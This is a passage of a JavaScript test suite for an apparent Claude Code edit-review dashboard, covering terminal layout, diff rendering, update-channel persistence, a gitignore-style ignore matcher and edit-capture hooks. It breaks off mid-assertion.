test('layout: every seam is grabbable, on both axes, and resizes a pane that honours it', () => {
  // 48 rows, not 40: at 40 the Claude strip opens with EXACTLY its min and no slack, so the
  // "dragging must grow the target" property below cannot hold for its seam — a ceiling, not a bug.
  const lay = tui.resolveLayout({ cols: 140, rows: 48, minimized: new Set(), focus: 'traces' });
  assert.ok(lay.seams.length >= 4, 'columns, both docks and the Claude strip all get a boundary');
  // The band's top is below EVERY top-dock box, summed — the same derivation hitTest uses. This line
  // used to read only the prompts box, exactly mirroring the product's own single-top-pane assumption,
  // so the pair passed together while both were wrong for a second top pane.
  const bandTop =
    lay.chrome.top +
    lay.boxes
      .filter((b) => tui.PANE_SPECS.find((p) => p.id === b.id).dock === 'top')
      .reduce((a, b) => a + b.rect.h, 0);
  const ids = new Set(lay.boxes.map((b) => b.id));

  for (const sm of lay.seams) {
    assert.ok(ids.has(sm.left) && ids.has(sm.right), `seam joins real panes: ${sm.left}/${sm.right}`);
    if (sm.axis === 'v') {
      assert.ok(sm.x >= 0 && sm.x < lay.cols, `on screen (x=${sm.x})`);
      // A one-column target is unhittable, so the grab spans ±1 — but not ±2, or a row click drags.
      for (const d of [-1, 0, 1]) assert.equal(tui.hitTest(lay, sm.x + d, bandTop + 1)?.t, 'seam', `x${d} grabs`);
      for (const d of [-2, 2]) assert.notEqual(tui.hitTest(lay, sm.x + d, bandTop + 1)?.t, 'seam', `x${d} is a row`);
    } else {
      assert.ok(sm.y > lay.chrome.top && sm.y < lay.rows, `on screen (y=${sm.y})`);
      assert.equal(tui.hitTest(lay, 10, sm.y)?.t, 'seam', 'the horizontal seam grabs across the width');
    }

    // The decisive property: dragging must move a pane that ACTUALLY honours a size. Detail is the
    // flex centre and discards one, so its seam has to target the neighbour instead.
    const box = lay.boxes.find((b) => b.id === sm.target);
    const before = sm.axis === 'v' ? box.rect.w : box.rect.h;
    const after = tui.resolveLayout({
      cols: 140, rows: 48, minimized: new Set(), focus: 'traces', sizes: { [sm.target]: before + 5 },
    }).boxes.find((b) => b.id === sm.target);
    const got = sm.axis === 'v' ? after.rect.w : after.rect.h;
    assert.ok(got > before, `dragging the ${sm.left}|${sm.right} seam must resize ${sm.target} (${before} -> ${got})`);
  }
});

test('layout: sizes.claude clamps at min and never starves the columns', () => {
  const min = tui.PANE_SPECS.find((p) => p.id === 'claude').min;
  for (const want of [0, 1, 2, 3, 4, 10, 50, 500]) {
    const lay = tui.resolveLayout({ cols: 140, rows: 48, minimized: new Set(), focus: 'traces', sizes: { claude: want } });
    const cl = lay.boxes.find((b) => b.id === 'claude');
    assert.ok(cl, `sized ${want}: claude stays open at this terminal size`);
    assert.ok(cl.rect.h >= min, `sized ${want}: floored at min (got ${cl.rect.h})`);
    assert.ok(lay.colH >= tui.COL_FLOOR, `sized ${want}: the columns keep their floor (got ${lay.colH})`);
  }
});

test('richdiff: a wrapped code line reproduces its bytes, indentation included', () => {
  // Word-wrapping split on spaces and silently ate leading indentation: `  return x` rendered as
  // `return x`. In code that misrepresents the source; in Python it changes what the code MEANS.
  // A diff must break wherever the width runs out and reproduce every byte either side of the break.
  const src = '  return CANDIDATES.find((s) => displayWidth(s) <= budget) ?? "?";';
  const patch = require('diff').createPatch('x.ts', 'a\n', `${src}\n`);
  for (const cols of [30, 38, 44, 60]) {
    const out = tui.renderRichDiff(patch, { cols, color: 'none', path: 'x.ts' });
    const body = out.filter((l) => /^\s*\d+\s\+/.test(l) || /^\s+\S/.test(l.slice(0, 40)) === false ? false : true);
    // Rebuild from the rendered rows: strip the gutter+marker from the first, the gutter from the rest.
    const rows = out.slice(out.findIndex((l) => /^\s*\d+\s\+/.test(l)));
    const gut = rows[0].indexOf('+');
    const joined = rows
      .map((l, i) => (i === 0 ? l.slice(gut + 1) : l.slice(gut + 1)))
      .join('')
      .replace(/\s+$/, '');
    assert.equal(joined, src, `cols=${cols}: every byte, including the two leading spaces`);
    for (const l of out) assert.ok(tui.displayWidth(l) <= cols, `cols=${cols}: within budget`);
  }
  // Positive control: word wrapping really does lose the indentation, so this test can fail.
  assert.notEqual(tui.wrapVisible(src, 30).join(''), src, 'word-wrap is lossy for indented code');
});

test('richdiff: intra-line highlighting marks what changed, and refuses to guess', () => {
  const { createPatch } = require('diff');
  // The point of a review diff: `cols - 1` -> `cols - 2` should show the 1 and the 2, not two
  // full-width stripes the reader has to compare by eye.
  const marked = tui.markIntraline(tui.parsePatch(createPatch('x.ts',
    'const budget = cols - 1;\nconst label = "the quick brown fox";\n',
    'const budget = cols - 2;\nconst label = "the quick red fox";\n')));
  const spans = marked.filter((l) => l.spans && l.spans.length);
  assert.equal(spans.length, 4, 'both replaced lines are marked, on each side');
  const words = spans.map((l) => l.spans.map(([a, b]) => l.text.slice(a, b)).join('')).sort();
  assert.deepEqual(words, ['1', '2', 'brown', 'red'], `exactly the changed words, got ${JSON.stringify(words)}`);

  // A 3-removed / 1-added hunk has no honest pairing. Inventing one would highlight spans that never
  // corresponded — worse than none, because the reader would believe it.
  const uneven = tui.markIntraline(tui.parsePatch(createPatch('y.ts', 'a\nb\nc\n', 'z\n')));
  assert.ok(!uneven.some((l) => l.spans), 'unequal runs are left unmarked');

  // And the brighter tone actually reaches the frame, on both sides.
  const out = tui.renderRichDiff(createPatch('x.ts', 'const b = 1;\n', 'const b = 2;\n'),
    { cols: 52, color: 'truecolor', path: 'x.ts' });
  assert.equal(out.filter((l) => /48;2;106;30;30|48;2;26;86;38/.test(l)).length, 2, 'one marked del, one marked add');
  for (const l of out) assert.ok(tui.displayWidth(l) <= 52, 'still within budget');
});

test('panes: the Detail navbar is clickable exactly where it is drawn', () => {
  const { createPatch } = require('diff');
  const st = paneFixture({
    views: { list: { edits: [{ id: 12, file: 'a.ts', added: 8, removed: 3, state: 'pending', ts: 0 }] } },
    panes: { minimized: new Set(), zoom: null, focus: 'detail', tab: {}, cursor: {}, scroll: {}, sizes: {} },
    diffPatch: createPatch('a.ts', 'x\n', 'y\n'),
    diffMeta: { id: 12, path: 'a.ts', added: 8, removed: 3 },
  });
  const lay = tui.resolveLayout({ cols: 150, rows: 34, minimized: new Set(), focus: 'detail' });
  const box = lay.boxes.find((b) => b.id === 'detail');
  const line = tui.renderDashFrame(st, { cols: 150, rows: 34, color: false })[box.navRow];

  const btns = tui.detailNavButtons(box, st);
  assert.deepEqual(btns.map((b) => b.action), ['keep', 'undo', 'prev', 'next'], 'all four at a wide size');
  for (const b of btns) {
    // The renderer draws from these spans; if it ever recomputed them instead, a button would be
    // drawn in one place and clickable in another with nothing on screen to reveal the drift.
    const at = line.slice(b.x, b.x + b.w);
    assert.match(at, /Keep|Undo|prev|next/, `${b.action} is drawn at its own x (got ${JSON.stringify(at)})`);
    // …and DRAWN is not enough. The click has to resolve to this row, which is the half no test made:
    // the button row was hit-tested as body, so every one of these was dead to the mouse.
    assert.deepEqual(tui.hitTest(lay, b.x, box.navRow), { t: 'nav', pane: 'detail' }, `${b.action} is clickable there too`);
  }

  // Narrow: buttons drop WHOLE, never clipped to a stub that still looks pressable. Keep/Undo last.
  const narrow = tui.resolveLayout({ cols: 85, rows: 34, minimized: new Set(), focus: 'detail' });
  const nbox = narrow.boxes.find((b) => b.id === 'detail');
  const few = tui.detailNavButtons(nbox, st).map((b) => b.action);
  assert.ok(few.length < 4 && few.includes('keep') && few.includes('undo'), `the destructive pair survives longest, got ${JSON.stringify(few)}`);
  for (const b of tui.detailNavButtons(nbox, st)) {
    assert.ok(b.x >= nbox.rect.x && b.x + b.w <= nbox.rect.x + nbox.rect.w, `${b.action} stays inside the pane`);
  }

  // With nothing selected, Keep/Undo are ABSENT rather than drawn-but-dim: without colour a dim
  // button renders identically to a live one, and one that looks pressable but refuses is worse than
  // one never offered. prev/next remain, because they still move the review on.
  const empty = paneFixture({ panes: { minimized: new Set(), zoom: null, focus: 'detail', tab: {}, cursor: {}, scroll: {}, sizes: {} } });
  const none = tui.detailNavButtons(box, empty).map((b) => b.action);
  assert.deepEqual(none, ['prev', 'next'], `nothing to act on means no act buttons, got ${JSON.stringify(none)}`);
});

test('channel: a switch that cannot persist says so, and never reports success it did not achieve', () => {
  const fs = require('fs');
  const os = require('os');
  const path = require('path');
  const prev = process.env.CLAUDE_CONFIG_DIR;
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'obs-chan-'));
  try {
    process.env.CLAUDE_CONFIG_DIR = dir;
    core.setUpdateChannel('dev');
    assert.equal(core.getUpdateChannel(), 'dev', 'a writable dir round-trips — the positive control');

    // Not writable: the common devcontainer shape, where the config dir is bind-mounted read-only or
    // owned by another uid. The raw failure is an EACCES trace naming a path the reader never chose.
    //
    // A FRESH read-only directory, not a chmod of the one above: mode 500 on a directory still
    // permits writing a file that already exists, so re-using it would test nothing and pass.
    //
    // WINDOWS: chmod does not remove write access there, so this half's SETUP cannot be built — the
    // directory would still accept the write, and the assertions below would be checking a condition
    // that never happened. The positive control above runs everywhere.
    if (process.platform !== 'win32') {
    const ro = fs.mkdtempSync(path.join(os.tmpdir(), 'obs-chan-ro-'));
    fs.chmodSync(ro, 0o500);
    process.env.CLAUDE_CONFIG_DIR = ro;
    let msg = '';
    try { core.setUpdateChannel('stable'); } catch (e) { msg = e.message; }
    try { fs.chmodSync(ro, 0o700); fs.rmSync(ro, { recursive: true, force: true }); } catch { /* best effort */ }
    process.env.CLAUDE_CONFIG_DIR = dir;
    assert.ok(msg, 'it throws rather than silently leaving the reader on the old channel');
    assert.match(msg, /could not save the update channel/, 'says what failed');
    assert.match(msg, /CLAUDE_CONFIG_DIR/, 'and names the override that fixes it');
    assert.match(msg, /obs-chan-ro-/, 'and the actual path that could not be written');
    assert.equal(core.getUpdateChannel(), 'dev', 'the old channel is untouched by a failed switch');
    }
  } finally {
    try { fs.chmodSync(dir, 0o700); fs.rmSync(dir, { recursive: true, force: true }); } catch { /* best effort */ }
    if (prev === undefined) delete process.env.CLAUDE_CONFIG_DIR;
    else process.env.CLAUDE_CONFIG_DIR = prev;
  }
});

test('doctor: "writable" and "the setting persists" are separate claims', () => {
  const fs = require('fs');
  const os = require('os');
  const path = require('path');
  const prev = process.env.CLAUDE_CONFIG_DIR;
  const ok = fs.mkdtempSync(path.join(os.tmpdir(), 'obs-doc-'));
  const ro = fs.mkdtempSync(path.join(os.tmpdir(), 'obs-doc-ro-'));
  try {
    // Writable: the check passes AND leaves the reader's own channel untouched — a diagnostic that
    // changes the thing it measures is worse than none.
    process.env.CLAUDE_CONFIG_DIR = ok;
    core.setUpdateChannel('dev');
    const good = core.diagnose({ cwd: process.cwd() }).find((c) => c.id === 'channel-persist');
    assert.equal(good.level, 'ok', 'a real local dir round-trips');
    assert.equal(core.getUpdateChannel(), 'dev', 'and the probe restored what was there');

    // Not writable: the shape a devcontainer usually has. This must be its OWN failure, not folded
    // into "config dir writable" — a switch can fail on a filesystem that accepts other writes.
    // WINDOWS: chmod cannot make a directory refuse a write there, so the condition under test does
    // not exist and the probe correctly reports `ok`. Skipped rather than inverted — asserting `ok`
    // here would pin the ABSENCE of the failure mode, which is not what this test is about.
    if (process.platform !== 'win32') {
      fs.chmodSync(ro, 0o500);
      process.env.CLAUDE_CONFIG_DIR = ro;
      const bad = core.diagnose({ cwd: process.cwd() }).find((c) => c.id === 'channel-persist');
      assert.equal(bad.level, 'fail', 'a config dir that refuses the write is reported');
      assert.match(bad.fix, /CLAUDE_CONFIG_DIR/, 'and names the override');
      assert.match(bad.detail, /switching channels will fail/, 'in the reader’s terms, not errno terms');
    }
  } finally {
    try { fs.chmodSync(ro, 0o700); } catch { /* best effort */ }
    for (const d of [ok, ro]) { try { fs.rmSync(d, { recursive: true, force: true }); } catch { /* best effort */ } }
    if (prev === undefined) delete process.env.CLAUDE_CONFIG_DIR;
    else process.env.CLAUDE_CONFIG_DIR = prev;
  }
});

// ---------------------------------------------------------------------------------------------
// .observatoryignore — the matcher
// ---------------------------------------------------------------------------------------------
//
// A hand-rolled gitignore is where this kind of feature usually breaks, so these assert the cases
// that actually bite rather than the ones that are easy. `home: null` isolates each from the
// reader's own personal layer; one test below covers that layer on purpose.

function ignoreWork(files) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'cc-ign-'));
  for (const [rel, body] of Object.entries(files)) {
    const p = path.join(root, rel);
    fs.mkdirSync(path.dirname(p), { recursive: true });
    fs.writeFileSync(p, body);
  }
  return root;
}

test('ignore: one mode — a match is never recorded, and the rule that decided is named', () => {
  const root = ignoreWork({ '.observatoryignore': 'package-lock.json\n' });
  const ctx = core.ignoreContext({ home: null });
  const d = ctx.decide(path.join(root, 'package-lock.json'));
  assert.equal(d.ignored, true);
  assert.equal(d.rule.pattern, 'package-lock.json');
  assert.equal(d.rule.line, 1, 'the line number is what makes a misfire diagnosable');
  assert.equal(ctx.ignored(path.join(root, 'package.json')), false, 'and nothing else is touched');
});

test('ignore: "# capture:" is an ordinary comment again, in every position', () => {
  // It used to switch later patterns from hiding to refusing. With one mode there is nothing for it
  // to switch, and a line git treats as a comment must not quietly mean something here — a file
  // copied from a .gitignore has to behave the same in both.
  const root = ignoreWork({
    '.observatoryignore': 'notes.md\n# capture: off\n*.mp4\n# capture: on\n*.tmp\n',
  });
  const ctx = core.ignoreContext({ home: null });
  for (const f of ['notes.md', 'clip.mp4', 'a.tmp']) {
    assert.equal(ctx.ignored(path.join(root, f)), true, f + ' is ignored by its own pattern');
  }
  assert.equal(ctx.ignored(path.join(root, 'keep.txt')), false, 'and the comments matched nothing');
  const rules = ctx.layers.flatMap((l) => l.rules);
  assert.equal(rules.length, 3, 'three patterns, no directives');
  assert.equal(rules.some((r) => 'refuse' in r), false, 'and no mode flag survives on a rule');
});

test('ignore: git’s excluded-parent rule — a negation cannot reach into an ignored directory', () => {
  // The single most famous gitignore gotcha. Matching git here is deliberate: deviating would
  // surprise everyone who knows the format, so instead the decision names the ANCESTOR that ended
  // the descent, which is what makes it diagnosable.
  const root = ignoreWork({ '.observatoryignore': 'dist/\n!dist/manifest.json\n' });
  const ctx = core.ignoreContext({ home: null });
  const d = ctx.decide(path.join(root, 'dist/manifest.json'));
  assert.equal(d.ignored, true, 'still ignored, exactly as git would');
  assert.equal(d.matched, path.join(root, 'dist').replace(/\\/g, '/'), 'and the DIRECTORY is named as the cause');
  assert.equal(d.rule.pattern, 'dist/');
});

test('ignore: `dist/*` + `!dist/manifest.json` — the form that does work', () => {
  const root = ignoreWork({ '.observatoryignore': 'dist/*\n!dist/manifest.json\n' });
  const ctx = core.ignoreContext({ home: null });
  assert.equal(ctx.ignored(path.join(root, 'dist/bundle.js')), true);
  assert.equal(ctx.ignored(path.join(root, 'dist/manifest.json')), false, 're-included: no ancestor was excluded');
});

test('ignore: `dist/` matches only a directory, `dist` matches a file too', () => {
  const a = ignoreWork({ '.observatoryignore': 'dist/\n', 'dist': 'a file named dist' });
  const ctxA = core.ignoreContext({ home: null });
  assert.equal(ctxA.ignored(path.join(a, 'dist')), false, 'trailing slash means directories only');

  const b = ignoreWork({ '.observatoryignore': 'dist\n', 'dist': 'a file named dist' });
  const ctxB = core.ignoreContext({ home: null });
  assert.equal(ctxB.ignored(path.join(b, 'dist')), true, 'without it, a file of that name matches');
  assert.equal(ctxB.ignored(path.join(b, 'dist/x.js')), true, 'and it still excludes the subtree');
});

test('ignore: a path whose ancestor is a FILE does not throw, on any platform', () => {
  // `fs.statSync(p, { throwIfNoEntry: false })` suppresses ENOENT and nothing else. When a component
  // of the path is a file rather than a directory, Linux reports ENOTDIR and it throws — while macOS
  // reports the same case as ENOENT and swallows it. So the product was macOS-correct and crashed on
  // Linux, and the `dist/` test above is green on a Mac either way; CI is what caught it.
  //
  // This test makes the Linux behaviour reproducible EVERYWHERE by stubbing the errno, because a
  // platform-dependent test is one that a Mac-only contributor cannot run before pushing.
  const fs = require('fs');
  const os = require('os');
  const path = require('path');
  const real = fs.statSync;
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'obs-ign-notdir-'));
  try {
    fs.writeFileSync(path.join(root, '.observatoryignore'), 'dist\n');
    fs.writeFileSync(path.join(root, 'dist'), 'a file named dist');
    fs.statSync = (p, o) => {
      if (String(p).includes(`${path.sep}dist${path.sep}`)) {
        const e = new Error('ENOTDIR: not a directory');
        e.code = 'ENOTDIR';
        throw e;
      }
      return real(p, o);
    };
    const ctx = core.ignoreContext({ home: null });
    // Both halves: it must not throw, AND it must still answer correctly. A guard that swallowed the
    // error and then returned the wrong verdict would turn a crash into a file that quietly captures.
    assert.equal(ctx.ignored(path.join(root, 'dist/x.js')), true,
      'the subtree of a file-named-dist is still excluded, through an ENOTDIR on the way up');
  } finally {
    fs.statSync = real;
    fs.rmSync(root, { recursive: true, force: true });
  }
});

test('ignore: a leading slash anchors to the file’s own directory', () => {
  const root = ignoreWork({ '.observatoryignore': '/build\n' });
  const ctx = core.ignoreContext({ home: null });
  assert.equal(ctx.ignored(path.join(root, 'build/out.js')), true, 'at the top: anchored and matched');
  assert.equal(ctx.ignored(path.join(root, 'pkg/build/out.js')), false, 'deeper: the anchor holds it out');
});

test('ignore: `*` stops at a separator, `**` spans them', () => {
  const root = ignoreWork({ '.observatoryignore': 'src/*.log\nfixtures/**/*.bin\n' });
  const ctx = core.ignoreContext({ home: null });
  assert.equal(ctx.ignored(path.join(root, 'src/a.log')), true);
  assert.equal(ctx.ignored(path.join(root, 'src/deep/a.log')), false, '`*` never crosses a slash');
  assert.equal(ctx.ignored(path.join(root, 'fixtures/a.bin')), true, '`**/` also matches zero directories');
  assert.equal(ctx.ignored(path.join(root, 'fixtures/x/y/a.bin')), true);
});

test('ignore: a deeper file overrides a shallower one', () => {
  const root = ignoreWork({
    '.observatoryignore': '*.log\n',
    'keep/.observatoryignore': '!*.log\n',
  });
  const ctx = core.ignoreContext({ home: null });
  assert.equal(ctx.ignored(path.join(root, 'a.log')), true, 'the shallow rule still applies elsewhere');
  assert.equal(ctx.ignored(path.join(root, 'keep/a.log')), false, 'nearest wins');
});

test('ignore: a pattern that matches nothing leaves every edit visible', () => {
  // The whole reason hiding is the default: a typo must be harmless.
  const root = ignoreWork({ '.observatoryignore': 'pakcage-lock.json\nsrc/**/[\n' });
  const ctx = core.ignoreContext({ home: null });
  assert.equal(ctx.ignored(path.join(root, 'package-lock.json')), false);
  assert.equal(ctx.ignored(path.join(root, 'src/a.ts')), false, 'and a malformed pattern is inert, not fatal');
});

test('ignore: `files` reports exactly what was read, for cache stamping', () => {
  const root = ignoreWork({
    '.observatoryignore': '*.log\n',
    'sub/.observatoryignore': '*.tmp\n',
    'other/.observatoryignore': '*.bak\n',
  });
  const ctx = core.ignoreContextFor([path.join(root, 'sub/a.ts')]);
  const rel = ctx.files.map((f) => path.relative(root, f).replace(/\\/g, '/'));
  assert.deepEqual(rel, ['.observatoryignore', 'sub/.observatoryignore'],
    'the governing files, and not the one on a branch nobody asked about');
  assert.equal(ctx.active, true);
});

test('ignore: with no ignore file anywhere, nothing is active and nothing is hidden', () => {
  // The negative, proven with a positive control below it: an instrument that always says "clean"
  // is indistinguishable from a broken one.
  const root = ignoreWork({ 'a.ts': 'x' });
  const quiet = core.ignoreContext({ home: null });
  assert.equal(quiet.ignored(path.join(root, 'a.ts')), false);
  assert.equal(quiet.active, false);
  assert.deepEqual(quiet.files, []);
  fs.writeFileSync(path.join(root, '.observatoryignore'), 'a.ts\n');
  const loud = core.ignoreContext({ home: null });
  assert.equal(loud.ignored(path.join(root, 'a.ts')), true, 'positive control: the same probe DOES fire');
  assert.equal(loud.active, true);
});

test('ignore: the personal ~/.claude layer matches at any depth, and is the weakest', () => {
  const home = freshHome();
  fs.mkdirSync(path.join(home, '.claude'), { recursive: true });
  fs.writeFileSync(path.join(home, '.claude', '.observatoryignore'), '*.log\nscratch/\n');
  const root = ignoreWork({ 'keep/.observatoryignore': '!*.log\n' });
  const ctx = core.ignoreContext();
  assert.equal(ctx.ignored(path.join(root, 'deep/nested/a.log')), true, 'unanchored: it applies anywhere');
  assert.equal(ctx.ignored(path.join(root, 'x/scratch/note.md')), true, 'including its directory rule');
  assert.equal(ctx.ignored(path.join(root, 'keep/a.log')), false, 'a repo file overrides the personal one');
});

test('ignore: a file is re-read the moment it changes, and forgotten when deleted', () => {
  // The stale-cache failure this feature would otherwise have: the parse is memoized, so an edit
  // that changed nothing on screen would look exactly like a pattern that does not work.
  const root = ignoreWork({ '.observatoryignore': '*.log\n' });
  const target = path.join(root, 'a.log');
  assert.equal(core.ignoreContext({ home: null }).ignored(target), true);
  const ig = path.join(root, '.observatoryignore');
  fs.writeFileSync(ig, '*.tmp\n');
  // The cache stamp is (mtime, size), and this rewrite is the SAME SIZE as the original — so the only
  // thing that can distinguish them is the clock. Windows timestamps are ~10ms-granular, so two writes
  // in one tick share an mtime and the stamp genuinely cannot see the edit; on Linux and macOS the
  // sub-millisecond resolution hides that. Push the mtime forward explicitly: this test is about the
  // cache noticing a CHANGED file, not about how finely the host filesystem can tell the time.
  const later = new Date(Date.now() + 2000);
  fs.utimesSync(ig, later, later);
  assert.equal(core.ignoreContext({ home: null }).ignored(target), false, 'edited: picked up at once');
  fs.rmSync(path.join(root, '.observatoryignore'));
  const gone = core.ignoreContext({ home: null });
  assert.equal(gone.ignored(target), false);
  assert.deepEqual(gone.files, [], 'deleted: dropped from the cache-stamp inputs too');
});

test('ignore: a same-size rewrite at the same mtime is INVISIBLE — the stamp\'s known limit', () => {
  // The parse cache is keyed on (mtime, size). Two consequences, and this pins both so neither is a
  // surprise: the cache works, and there is exactly one shape it cannot see.
  //
  // This is not academic. It is what made the suite red on Windows and green here: NTFS timestamps
  // through Node are ~10ms-granular, so the sibling test's two same-size writes landed on ONE mtime
  // and the edit was genuinely missed — while Linux and macOS resolve finely enough to hide it. The
  // condition is forced here rather than raced for, so the behaviour is the same on every platform.
  const fs = require('fs');
  const os = require('os');
  const path = require('path');
  const FIXED = new Date(1_700_000_000_000);
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'obs-ig-stamp-'));
  const prev = process.env.CLAUDE_OBSERVATORY_ROOT;
  try {
    const ig = path.join(root, '.observatoryignore');
    const target = path.join(root, 'a.log');
    fs.writeFileSync(ig, '*.log\n');
    fs.utimesSync(ig, FIXED, FIXED);
    assert.equal(core.ignoreContext({ home: null }).ignored(target), true, 'the first read caches these rules');

    // Same SIZE, same MTIME, different CONTENT — the one edit the stamp cannot distinguish.
    fs.writeFileSync(ig, '*.tmp\n');
    fs.utimesSync(ig, FIXED, FIXED);
    assert.equal(core.ignoreContext({ home: null }).ignored(target), true,
      'DOCUMENTED LIMIT: identical stamp means the cached parse is reused, so this edit is not seen');

    // …and the moment either half of the stamp moves, it is seen. This is what makes the limit a
    // narrow one rather than a broken cache, and it is the assertion that fails if the stamp changes.
    const later = new Date(FIXED.getTime() + 2000);
    fs.utimesSync(ig, later, later);
    assert.equal(core.ignoreContext({ home: null }).ignored(target), false, 'a moved mtime is picked up');
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
    if (prev === undefined) delete process.env.CLAUDE_OBSERVATORY_ROOT;
    else process.env.CLAUDE_OBSERVATORY_ROOT = prev;
  }
});

test('ignore: parseIgnoreFile keeps blank lines and comments out of the rules', () => {
  const rules = core.parseIgnoreFile('\n# a comment\n\n  spaced.txt  \n!keep.txt\n', '/x/.observatoryignore');
  assert.equal(rules.length, 2);
  assert.equal(rules[0].pattern, 'spaced.txt');
  assert.equal(rules[0].negated, false);
  assert.equal(rules[1].negated, true);
  assert.equal(rules[1].line, 5, 'line numbers count the skipped lines');
});

// ---------------------------------------------------------------------------------------------
// .observatoryignore — what it does to capture, to the lists, and to undo
// ---------------------------------------------------------------------------------------------

/** Drive the real capture hook for one Edit, Pre then Post, exactly as Claude Code would. */
function editHook(session, cwd, file, before, after) {
  if (before === null) { try { fs.rmSync(file); } catch { /* absent is the point */ } }
  else fs.writeFileSync(file, before);
  const p = { session_id: session, cwd, tool_name: 'Edit', tool_input: { file_path: file } };
  core.handleHookPayload({ ...p, hook_event_name: 'PreToolUse' });
  fs.writeFileSync(file, after);
  core.handleHookPayload({ ...p, hook_event_name: 'PostToolUse' });
}

test('scopes: functions are detected per language, and a miss is a MISS — never a guess', () => {
  const at = (file, text, line) => {
    const s = core.detectScopes(text, file);
    const hit = core.scopeAt(s, line);
    return hit ? hit.name : null;
  };
  assert.equal(at('a.py', 'class P:\n    def parse(self):\n        return 1\n', 2), 'parse', 'python def');
  assert.equal(at('a.py', 'class P:\n    def parse(self):\n        return 1\n', 0), 'P', 'python class');
  assert.equal(at('a.ts', 'class Foo {\n  bar(x) {\n    return x;\n  }\n}\n', 2), 'bar', 'a bare TS method');
  assert.equal(at('a.ts', 'const qux = async (n) => {\n  return n;\n};\n', 1), 'qux', 'an arrow assigned to a const');
  assert.equal(at('a.go', 'func (s *S) Serve() {\n\treturn\n}\n', 1), 'Serve', 'a go method with a receiver');
  assert.equal(at('a.rs', 'pub async fn run(x: u32) {\n    x\n}\n', 1), 'run', 'a rust fn with modifiers');
  assert.equal(at('A.java', 'class A {\n  private static int add(int a) {\n    return a;\n  }\n}\n', 2), 'add', 'a java method');

  // The innermost span wins, which is what makes "same function" mean the method and not its class.
  assert.equal(at('a.ts', 'class Foo {\n  bar() {\n    return 1;\n  }\n}\n', 1), 'bar', 'the method, not the class it sits in');

  // …and the traps. A control structure is not a function called `if`, a call statement is not a
  // declaration, and a language the table does not cover answers null rather than something plausible.
  assert.equal(at('a.ts', 'function real() {\n  if (x) {\n    go();\n  }\n}\n', 2), 'real', 'an if-body belongs to its function');
  assert.equal(at('a.ts', 'doThing(x);\nother(y);\n', 0), null, 'a bare call declares nothing');
  assert.equal(at('notes.md', '# hi\nsome text\n', 1), null, 'an unknown extension has no scopes, and says so');
  assert.deepEqual(core.detectScopes('whatever\n', 'x.unknownext'), [], 'no guessing outside the coverage table');
});

test('units: two edits to DIFFERENT lines of the same function are one decision', () => {
  freshHome();
  const S = 'u4';
  const F = path.join(tmpWork(), 'a.py');
  // `parse` is revised twice — first the guard, then the return — and `helper` is touched in between.
  // Neither parse edit touches the other's lines, so the same-LINES rule alone leaves three units; the
  // same-FUNCTION rule is what makes the two parse edits one thing to accept.
  const at = (guard, ret, helper) =>
    [
      'def parse(s):',
      `    if ${guard}:`,
      `    return ${ret}`,
      '',
      'def helper(x):',
      `    return ${helper}`,
      '',
    ].join('\n');
  seedEdit(S, F, at('a', '1', 'h'), at('b', '1', 'h')); // #1 parse, guard line
  seedEdit(S, F, at('b', '1', 'h'), at('b', '1', 'j')); // #2 helper — a different function
  seedEdit(S, F, at('b', '1', 'j'), at('b', '2', 'j')); // #3 parse again, a DIFFERENT line of it

  assert.deepEqual(core.groupMembers(S, 3), [1, 2, 3], 'both parse edits are one unit; #2 rides the span');
  assert.equal(core.pendingGroups(S).size, 1);

  // …and the control: the same three edits with `helper` in a language the detector cannot read stay
  // grouped only by lines, so the two `parse` edits do NOT merge on a name nobody detected.
  freshHome();
  const S2 = 'u5';
  const G = path.join(tmpWork(), 'a.unknownext');
  seedEdit(S2, G, at('a', '1', 'h'), at('b', '1', 'h'));
  seedEdit(S2, G, at('b', '1', 'h'), at('b', '1', 'j'));
  seedEdit(S2, G, at('b', '1', 'j'), at('b', '2', 'j'));
  assert.equal(core.pendingGroups(S2).size, 3, 'no scopes detected -> no same-function merging, and no guess');
});

test('units: accepting an ask must expand its display units, or a row half-resolves', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const cwd = fs.realpathSync(tmpWork());
  const S = 'expand';
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  fs.writeFileSync(
    path.join(proj, S + '.jsonl'),
    JSON.stringify({ timestamp: new Date(500).toISOString(), type: 'user', message: { role: 'user', content: 'do the thing' } }) + '\n'
  );
  const F = path.join(cwd, 'f.txt');
  seedEdit(S, F, 'x\nA\ny\n', 'x\nB\ny\n'); // #1  ─ same line, same ask …
  seedEdit(S, F, 'x\nB\ny\n', 'x\nC\ny\n'); // #2  ─ … so one review unit, represented by #2

  const shown = core.promptEditIds(cwd, S, '1');
  assert.deepEqual(shown, [2], 'the ask reports its DISPLAY unit — one row, the representative');

  // The bug this pins: acting on what the row reports resolves #2 and strands #1 pending, at a state
  // no surface names — the row vanishes while the pending count says one is left.
  const expanded = [...new Set(shown.flatMap((id) => core.groupMembers(S, id)))].sort((a, b) => a - b);
  assert.deepEqual(expanded, [1, 2], 'expansion recovers every member behind that row');
  core.setStatusMany(S, expanded, 'kept');
  assert.equal(core.findRecord(S, 1).status, 'kept', 'the member behind the row is resolved too');
  assert.equal(core.findRecord(S, 2).status, 'kept');
  assert.equal(core.reviewEdits(S).filter((r) => r.status === 'pending').length, 0, 'nothing is left half-resolved');
});

test('capture: blank-line-only churn is not recorded, but any real change still is', () => {
  freshHome();
  const S = 'blank';
  const cwd = tmpWork();
  const F = path.join(cwd, 'a.py');

  editHook(S, cwd, F, 'def f():\n    return 1\n', 'def f():\n\n    return 1\n'); // + a blank line
  assert.equal(core.readLog(S).length, 0, 'an added blank line is not a decision — nothing recorded');

  editHook(S, cwd, F, 'a\n\n\nb\n', 'a\nb\n'); // - two blank lines
  assert.equal(core.readLog(S).length, 0, 'removed blank lines are not a decision either');

  editHook(S, cwd, F, 'x\n   \ny\n', 'x\ny\n'); // whitespace-only line: empty to the reader
  assert.equal(core.readLog(S).length, 0, 'a whitespace-only line reads as blank, and is treated as one');

  // POSITIVE CONTROL — the rule must not be swallowing real edits. Same shape, one character of
  // content changed alongside the blank line.
  editHook(S, cwd, F, 'def f():\n    return 1\n', 'def f():\n\n    return 2\n');
  assert.equal(core.readLog(S).length, 1, 'a real change rides through, blank line and all');
  const rec = core.readLog(S)[0];
  assert.equal(
